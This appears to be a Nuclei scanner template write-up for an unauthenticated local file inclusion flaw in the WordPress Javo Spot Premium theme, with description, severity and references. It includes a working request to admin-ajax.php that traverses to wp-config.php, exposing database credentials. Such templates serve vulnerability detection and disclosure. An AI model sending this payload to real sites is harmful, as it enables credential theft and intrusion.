# Nuclei Template: WordPress Javo Spot Premium Theme - Local File Inclusion
**Template ID:** wp-javospot-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-javospot-lfi.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated attackers access to locally stored file and return their content.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery
```

## References
- https://codeseekah.com/2017/02/09/javo-themes-spot-lfi-vulnerability/
- https://wpscan.com/vulnerability/2d465fc4-d4fa-43bb-9c0d-71dcc3ee4eab
- https://themeforest.net/item/javo-spot-multi-purpose-directory-wordpress-theme/13198068
